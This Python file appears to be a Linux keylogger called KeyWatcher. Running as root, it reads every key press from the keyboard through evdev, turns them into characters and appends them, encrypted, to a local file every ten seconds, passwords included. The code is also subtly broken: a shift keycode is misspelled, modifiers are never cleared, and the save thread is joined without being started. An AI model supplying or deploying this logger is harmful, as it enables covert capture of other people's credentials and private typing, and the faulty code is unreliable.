import evdev
from evdev import InputDevice, categorize, ecodes
import threading
import time
import signal
import sys
from getpass import getpass
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import base64
import os

class KeyWatcher:
    def __init__(self):
        self.device = None
        self.running = False
        self.buffer = []
        self.modifiers = set()
        self.fernet = None
        self.salt = None
        self.setup_encryption()

    def setup_encryption(self):
        password = getpass("Enter encryption password: ")
        # Generate a random salt 
        self.salt = os.urandom(16)
        kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=self.salt,
                iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        self.fernet = Fernet(key)
        # Save salt to file for decryption, handle securely
        with open("salt.bin", "wb") as f:
            f.write(self.salt)

    def select_device(self):
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        keyboards = []
        for dev in devices:
            if ecodes.EV_KEY in dev.capabilities():
                # Check for typical keyboard keys
                caps = dev.capabilities()[ecodes.EV_KEY]
                if ecodes.KEY_A in caps and ecodes.KEY_SPACE in caps:
                    keyboards.append(dev)
        if not keyboards:
            print("No keyboard detected.")
            sys.exit(1)
        self.device = keyboards[0]
        print(f"Monitoring: {self.device.name}")

    def start(self):
        self.running = True
        capture_thread = threading.Thread(target=self.capture_loop)
        save_thread = threading.Thread(target=self.save_loop)
        capture_thread.start()
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        capture_thread.join()
        save_thread.join()

    def capture_loop(self):
        try:
            for event in self.device.read_loop():
                if not self.running:
                    break
                if event.type == ecodes.EV_KEY:
                    self.process_event(event)
        except Exception as e:
            print(f"Error reading events: {e}")
            self.stop()

    def process_event(self, event):
        key_event = categorize(event)
        if key_event.keystate == 1: # Key down
            keycode = key_event.keycode
            # Update modifiers
            if keycode in ['KEY_LEFTSHIF', 'KEY_RIGHTSHIFT']:
                self.modifiers.add(keycode)
                return
            char = self.get_char(keycode)
            if char: 
                self.buffer.append((time.time(), char))
                self.check_alerts()

    def get_char(self, keycode):
        shift = 'KEY_LEFTSHIFT' in self.modifiers or 'KEY_RIGHTSHIFT' in self.modifiers
        key_map = {
                'KEY_A': ('a', 'A'), 'KEY_B': ('b', 'B'), 'KEY_C': ('c', 'C'), 'KEY_D': ('d', 'D'), 'KEY_E': ('e', 'E'), 'KEY_F': ('f', 'F'), 'KEY_G': ('g', 'G'), 'KEY_H': ('h', 'H'), 'KEY_I': ('i', 'I'), 'KEY_J': ('j', 'J'), 'KEY_K': ('k', 'K'), 'KEY_L': ('l', 'L'), 'KEY_M': ('m', 'M'), 'KEY_N': ('n', 'N'), 'KEY_O': ('o', 'O'), 'KEY_P': ('p', 'P'), 'KEY_Q': ('q', 'Q'), 'KEY_R': ('r', 'R'), 'KEY_S': ('s', 'S'), 'KEY_T': ('t', 'T'), 'KEY_U': ('u', 'U'), 'KEY_V': ('v', 'V'), 'KEY_W': ('w', 'W'), 'KEY_X': ('x', 'X'), 'KEY_Y': ('y', 'Y'), 'KEY_Z': ('z', 'Z'), 'KEY_1': ('1', '!'), 'KEY_2': ('2', '@'), 'KEY_3': ('3', '#'),
            'KEY_4': ('4', '$'), 'KEY_5': ('5', '%'), 'KEY_6': ('6', '^'),
            'KEY_7': ('7', '&'), 'KEY_8': ('8', '*'), 'KEY_9': ('9', '('),
            'KEY_0': ('0', ')'), 'KEY_SPACE': (' ', ' '), 'KEY_ENTER': ('\n', '\n'),
            'KEY_TAB': ('\t', '\t'), 'KEY_BACKSPACE': ('\b', '\b'),
            'KEY_MINUS': ('-', '_'), 'KEY_EQUAL': ('=', '+'),
            'KEY_LEFTBRACE': ('[', '{'), 'KEY_RIGHTBRACE': (']', '}'),
            'KEY_BACKSLASH': ('\\', '|'), 'KEY_SEMICOLON': (';', ':'),
            'KEY_APOSTROPHE': ('\'', '"'), 'KEY_GRAVE': ('`', '~'),
            'KEY_COMMA': (',', '<'), 'KEY_DOT': ('.', '>'), 'KEY_SLASH': ('/', '?'), }
        entry = key_map.get(keycode, None)
        if entry:
            return entry[1] if shift else entry[0]
        return None

    def check_alerts(self):
        enters = [ts for ts, c in self.buffer[-10:] if c == '\n']
        if len(enters) >= 3 and enters[-1] - enters[0] <= 5:
            print("\nALERT: Multiple login attempts detected!")

    def save_loop(self):
        while self.running:
            time.sleep(10) # Save every 10 seconds
            self.flush_buffer()

    def flush_buffer(self):
        if not self.buffer:
            return
        data = ''.join([c for (ts, c) in self.buffer])
        encrypted = self.fernet.encrypt(data.encode())
        with open('keystrokes.enc', 'ab') as f:
            f.write(encrypted + b'\n') # Newline-seperated encrypted entries
        self.buffer = []

    def signal_handler(self, signum, frame):
        print("\nStopping KeyWatcher...")
        self.stop()

    def stop(self):
        self.running = False
        self.flush_buffer()
        if self.device: 
            self.device.close()

if __name__ == '__main__':
    if os.getuid() != 0:
        print("Run with sudo to access input devices.")
        sys.exit(1)
    watcher = KeyWatcher()
    watcher.select_device()
    watcher.start()
